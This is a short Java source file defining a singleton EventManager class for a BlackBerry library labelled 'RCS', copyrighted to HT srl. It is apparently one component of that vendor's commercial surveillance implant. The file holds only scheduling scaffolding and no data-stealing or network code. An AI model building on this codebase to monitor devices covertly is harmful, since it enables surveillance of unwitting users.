//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : EventManager.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import net.rim.device.api.system.RuntimeStore;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.Singleton;


/**
 * The Class EventManager.
 */
public final class EventManager extends JobManager implements Singleton {

    private static final long GUID = 0x3c80b0de21f15f46L;

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug = new Debug("EventManager", DebugLevel.VERBOSE);
    //#endif

    /** The instance. */
    private static EventManager instance = null;

    /**
     * Gets the single instance of EventManager.
     * 
     * @return single instance of EventManager
     */
    public static synchronized EventManager getInstance() {
        if (instance == null) {
            instance = (EventManager) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                final EventManager singleton = new EventManager();
                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }

        }

        return instance;
    }

}
